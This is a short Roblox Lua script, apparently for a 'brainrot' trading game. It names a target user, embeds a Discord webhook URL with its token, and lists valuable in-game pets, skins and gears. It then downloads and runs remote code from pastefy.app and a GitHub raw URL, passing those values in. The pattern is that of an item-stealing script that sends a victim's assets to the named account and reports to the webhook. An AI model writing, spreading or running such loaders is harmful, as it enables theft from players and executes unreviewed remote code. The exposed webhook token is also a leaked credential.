local TARGET_ID = 9661773377
local TARGET_USER = "mxrley013"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1571317070174355598/Cw6lVVKAI_hibNW2depqb7zE9QvecWGUHbaMXu50ccA9RwKzup2Ug2_V0RxYX_rHvBhZ"

local TargetBrainrots = {
    ["Hydra Bunny"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Dragon Cannelloni"] = true,
    ["Griffin"] = true,
    ["Dragon Gingerini"] = true,
    ["Antonio"] = true,
    ["Elefanto Frigo"] = true,
    ["Rico Dinero"] = true,
    ["Rubrikiko"] = true,
    ["Arcadragon"] = true,
    ["Pancake and Syrup"] = true,
    ["Kalika Bros"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["Globa Steppa"] = true,
    ["Dug Dug Dug"] = true,
    ["La Supreme Combinasion"] = true,
    ["La Casa Boo"] = true,
    ["Dragon Aquanini"] = true,
    ["Signore Carapace"] = true,
    ["Fishino Clownino"] = true,
    ["Cerberus"] = true,
    ["Duggy Bros"] = true,
    ["Kraken"] = true,
    ["Venuspino"] = true,
    ["Gorillo Subwoofero"] = true,
    ["Foxini Lanternini"] = true,
    ["Headless Horseman"] = true,
    ["John Pork"] = true,
    ["Los Dragons"] = true,
    ["Meowl"] = true,
    ["Strawberry Elephant"] = true,
    ["Skibidi Toilet"] = true,
    ["Garama and Madundung"] = true
}

local TargetBaseSkins = {
    ["Aquatic"] = true,
    ["Bunny Basket"] = true,
    ["Candy"] = true,
    ["Christmas"] = true,
    ["Divine"] = true,
    ["Diamond"] = true,
    ["Cyber"] = true,
    ["Cursed"] = true,
    ["Easter"] = true,
    ["Galaxy"] = true,
    ["Gingerbread"] = true,
    ["Gold"] = true,
    ["Octo"] = true,
    ["Lucky"] = true,
    ["Lava"] = true,
    ["Halloween"] = true,
    ["Pot of Gold"] = true,
    ["Rainbow"] = true,
    ["Rose"] = true,
    ["Yin Yang"] = true,
    ["Taco"] = true,
    ["Radioactive"] = true,
    ["Summer"] = true,
    ["Valentines"] = true,
    ["Tralalero"] = true
}

local TargetGears = {
    ["Radioactive Airstrike"] = true,
    ["Santa's Sleigh"] = true,
    ["Witch's Broom"] = true,
    ["Cupid's Wings"] = true
}

task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/RsqRaQC0/raw"))()
end)

task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/LYkPHkU1/raw"))()

    task.wait(1)

    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)